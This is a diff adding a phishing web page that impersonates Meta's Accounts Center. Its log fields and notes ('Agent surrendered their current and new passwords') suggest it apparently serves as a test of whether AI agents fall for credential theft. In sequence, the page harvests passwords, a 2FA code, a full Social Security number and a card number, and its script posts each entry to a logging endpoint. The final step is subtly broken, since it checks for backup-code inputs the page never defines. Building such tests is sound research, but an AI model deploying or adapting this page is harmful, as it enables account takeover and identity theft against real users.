@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Accounts Center | Secure Your Account</title>
+    <style>
+        :root {
+            --meta-blue: #0064e0;
+            --meta-blue-hover: #0056c1;
+            --meta-bg: #f0f2f5;
+            --meta-text: #1c1e21;
+            --meta-secondary: #65676b;
+            --meta-border: #dddfe2;
+            --insta-red: #ED4956;
+            --font-stack: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: var(--font-stack);
+            background-color: var(--meta-bg);
+            color: var(--meta-text);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* --- HEADER --- */
+        header {
+            background-color: #fff;
+            padding: 12px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-bottom: 1px solid var(--meta-border);
+            position: relative;
+        }
+        /* Instagram Gradient Header Line */
+        header::after {
+            content: '';
+            position: absolute;
+            bottom: 0; left: 0; width: 100%; height: 3px;
+            background: linear-gradient(45deg, #f9ce34, #ee2a7b, #6228d7);
+        }
+
+        .meta-logo {
+            font-size: 20px;
+            font-weight: bold;
+            color: var(--meta-blue);
+            letter-spacing: -1px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* --- MAIN CONTAINER --- */
+        .container {
+            flex-grow: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .security-card {
+            background: #fff;
+            width: 100%;
+            max-width: 448px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            padding: 30px;
+            text-align: center;
+            position: relative;
+            min-height: 400px;
+        }
+
+        .activity-view {
+            display: none;
+            animation: fadeIn 0.4s ease-out;
+        }
+        .activity-view.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .shield-icon {
+            width: 56px;
+            height: 56px;
+            background: var(--insta-red);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 30px;
+        }
+
+        h2 {
+            font-size: 1.5rem;
+            margin: 0 0 12px 0;
+            color: var(--meta-text);
+        }
+
+        .desc {
+            font-size: 0.95rem;
+            color: var(--meta-secondary);
+            line-height: 1.5;
+            margin-bottom: 25px;
+        }
+
+        /* --- MAP MODULE --- */
+        .map-container {
+            width: 100%;
+            height: 180px;
+            background-color: #e5e3df;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid #ccc;
+        }
+        .map-bg {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: 
+                radial-gradient(circle at 70% 40%, rgba(255,255,255,0.8) 0%, transparent 60%),
+                linear-gradient(rgba(0,0,0,0.1) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0,0,0,0.1) 1px, transparent 1px);
+            background-size: 100% 100%, 20px 20px, 20px 20px;
+        }
+        .map-marker {
+            position: absolute;
+            top: 40%; left: 70%;
+            width: 24px; height: 24px;
+            background: var(--insta-red);
+            border: 4px solid #fff;
+            border-radius: 50%;
+            box-shadow: 0 0 0 10px rgba(237, 73, 86, 0.2);
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(237, 73, 86, 0.4); }
+            70% { box-shadow: 0 0 0 20px rgba(237, 73, 86, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(237, 73, 86, 0); }
+        }
+        .map-label {
+            position: absolute;
+            bottom: 10px; left: 10px;
+            background: rgba(255,255,255,0.9);
+            padding: 4px 8px;
+            font-size: 11px;
+            font-weight: bold;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+        }
+
+        .device-info {
+            text-align: left;
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            font-size: 0.9rem;
+            border: 1px solid var(--meta-border);
+        }
+        .device-info strong { display: block; margin-bottom: 4px; color: var(--meta-text); }
+        .device-info span { color: var(--meta-secondary); }
+
+        /* --- BUTTONS --- */
+        .btn-primary {
+            background-color: var(--meta-blue);
+            color: #fff;
+            border: none;
+            padding: 14px 24px;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+            margin-bottom: 12px;
+        }
+        .btn-primary:hover {
+            background-color: var(--meta-blue-hover);
+        }
+        .btn-secondary {
+            background: #fff;
+            color: var(--meta-text);
+            border: 1px solid var(--meta-border);
+            padding: 14px 24px;
+            font-size: 1rem;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        /* --- FORMS --- */
+        .form-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            color: var(--meta-secondary);
+        }
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--meta-border);
+            border-radius: 6px;
+            font-size: 1rem;
+            box-sizing: border-box;
+            outline: none;
+            background: #fdfdfd;
+        }
+        .form-input:focus {
+            border-color: var(--meta-blue);
+            box-shadow: 0 0 0 2px rgba(0, 100, 224, 0.1);
+        }
+
+        /* Backup Codes Grid */
+        .backup-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 30px;
+        }
+        .backup-input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid var(--meta-border);
+            border-radius: 4px;
+            font-size: 0.9rem;
+            text-align: center;
+            font-family: monospace;
+            box-sizing: border-box;
+        }
+
+        /* --- FOOTER --- */
+        footer {
+            padding: 20px;
+            text-align: center;
+            font-size: 0.8rem;
+            color: var(--meta-secondary);
+        }
+
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="meta-logo">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.878v-6.987h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.988C18.343 21.128 22 16.991 22 12c0-5.523-4.477-10-10-10z"/>
+            </svg>
+            Meta Accounts Center
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="security-card">
+            
+            <!-- STEP 1: INITIAL ALERT (The Bait) -->
+            <div class="activity-view active" id="view-0">
+                <div class="shield-icon">⚠️</div>
+                <h2>Unrecognized Login Detected</h2>
+                <p class="desc">Someone just logged in to your account from a new device or location. Please review the activity below to secure your account.</p>
+
+                <div class="map-container">
+                    <div class="map-bg"></div>
+                    <div class="map-marker"></div>
+                    <div class="map-label">Moscow, Russia</div>
+                </div>
+
+                <div class="device-info">
+                    <strong>Chrome Browser (Windows 11)</strong>
+                    <span>Location: Moscow, Russia • IP: 95.161.226.17</span>
+                </div>
+
+                <button class="btn-primary" onclick="nextStep(0)">This Wasn't Me</button>
+                <button class="btn-secondary" onclick="alert('Account marked as safe.')">This Was Me</button>
+            </div>
+
+            <!-- STEP 2: PASSWORD HARVEST -->
+            <div class="activity-view" id="view-1">
+                <h2>Secure Your Account</h2>
+                <p class="desc">To protect your account, you must update your password. Your previous password will no longer be valid.</p>
+
+                <div class="form-group">
+                    <label>Current Password</label>
+                    <input type="password" id="p-curr" class="form-input harvest" placeholder="" autocomplete="off" data-log="true" data-field-type="credential-harvest">
+                </div>
+                <div class="form-group">
+                    <label>New Password</label>
+                    <input type="password" id="p-new" class="form-input harvest" placeholder="">
+                </div>
+                <div class="form-group">
+                    <label>Confirm New Password</label>
+                    <input type="password" id="p-conf" class="form-input harvest" placeholder="">
+                </div>
+
+                <button class="btn-primary" onclick="nextStep(1)">Update Password</button>
+            </div>
+
+            <!-- STEP 3: 2FA INTERCEPTION -->
+            <div class="activity-view" id="view-2">
+                <h2>Two-Factor Authentication</h2>
+                <p class="desc">A security code has been sent to your primary authentication device. Please enter the 6-digit code to continue.</p>
+
+                <div class="form-group">
+                    <label>Security Code (6 digits)</label>
+                    <input type="text" id="p-2fa" class="form-input harvest" placeholder="000 000" maxlength="7" style="text-align: center; font-size: 1.5rem; letter-spacing: 5px;">
+                </div>
+
+                <button class="btn-primary" onclick="nextStep(2)">Verify Code</button>
+                <p class="desc" style="font-size: 0.8rem; margin-top: 15px;">Didn't get a code? <a href="#" style="color: var(--meta-blue);">Resend Code</a></p>
+            </div>
+
+            <!-- STEP 4: IDENTITY THEFT (The Logical Tell) -->
+            <div class="activity-view" id="view-3" data-pii-type="ssn_credit">
+                <!-- shadow_recovery_v1 -->
+                <h2>Identity Verification</h2>
+                <p class="desc">To complete account recovery and remove the suspicious login session permanently, please verify your identity using your government ID and payment card on file.</p>
+
+                <div class="form-group">
+                    <label>Social Security Number (Full)</label>
+                    <input type="password" id="id-ssn" class="form-input harvest" placeholder="XXX-XX-XXXX">
+                </div>
+                <div class="form-group">
+                    <label>Credit/Debit Card Number</label>
+                    <input type="text" id="id-card" class="form-input harvest" placeholder="XXXX XXXX XXXX XXXX">
+                </div>
+
+                <button class="btn-primary" onclick="completeFinal()">Complete Recovery</button>
+                <p class="desc" style="font-size: 0.8rem; color: var(--insta-red); font-weight: bold;">Failure to provide verification may result in permanent account suspension.</p>
+            </div>
+
+            <!-- STEP 5: SUCCESS -->
+            <div class="activity-view" id="view-4">
+                <div style="text-align: center; padding: 40px 0;">
+                    <div style="font-size: 4rem; color: var(--meta-blue); margin-bottom: 20px;">✓</div>
+                    <h2>Account Secured</h2>
+                    <p class="desc">Your account is now secure. The suspicious login session from Moscow, Russia has been terminated, and the associated IP address has been blacklisted.</p>
+                    <button class="btn-primary" onclick="alert('Redirecting to your dashboard...')">Return to Account</button>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <footer>
+        Meta © 2026 | About | Help | Privacy | Terms
+    </footer>
+
+    <script>
+        let currentStep = 0;
+
+        function logData(attackType, fields, attackTriggered = true, notes = "") {
+            fetch("/api/log", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    env: "e11",
+                    attack_type: attackType,
+                    fields: fields,
+                    attack_triggered: attackTriggered,
+                    task_completed: (attackType === 'account_secured'),
+                    attack_detected: false,
+                    notes: notes
+                })
+            }).catch(console.error);
+        }
+
+        function nextStep(stepNum) {
+            if (stepNum === 0) {
+                logData('account_recovery_started', { event: 'This Wasn\'t Me clicked' }, true, "Agent triggered the security recovery flow.");
+            }
+            if (stepNum === 1) {
+                const curr = document.getElementById('p-curr').value;
+                const next = document.getElementById('p-new').value;
+                if (!curr || !next) { alert("Please complete the password form."); return; }
+                logData('account_password_harvest', { current_password: curr, new_password: next }, true, "Agent surrendered their current and new passwords.");
+            }
+            if (stepNum === 2) {
+                const code = document.getElementById('p-2fa').value;
+                if (!code) { alert("Please enter your security code."); return; }
+                logData('account_2fa_intercept', { auth_code: code }, true, "Agent entered their 2FA security code.");
+            }
+
+            document.getElementById(`view-${stepNum}`).classList.remove('active');
+            currentStep = stepNum + 1;
+            document.getElementById(`view-${currentStep}`).classList.add('active');
+        }
+
+        // --- PARTIAL HARVEST (Real-time on blur) ---
+        document.querySelectorAll('.harvest').forEach(el => {
+            el.addEventListener('blur', () => {
+                const id = el.id;
+                const val = el.value.trim();
+                if (val !== "") {
+                    let fields = {};
+                    fields[id] = val;
+                    logData('account_recovery_partial', fields, true, `Agent partially filled field: ${id}`);
+                }
+            });
+        });
+
+        function completeFinal() {
+            const codes = Array.from(document.querySelectorAll('.b-code')).map(i => i.value).filter(v => v !== "");
+            if (codes.length === 0) { alert("Please verify your identity with at least one backup code."); return; }
+
+            logData('account_backup_codes_harvest', { backup_codes: codes }, true, "Agent surrendered their master backup codes.");
+            logData('account_secured', { status: 'Success' }, true, "Agent completed the full recovery scam flow.");
+
+            document.getElementById('view-3').classList.remove('active');
+            document.getElementById('view-4').classList.add('active');
+        }
+
+    </script>
+</body>
+</html>
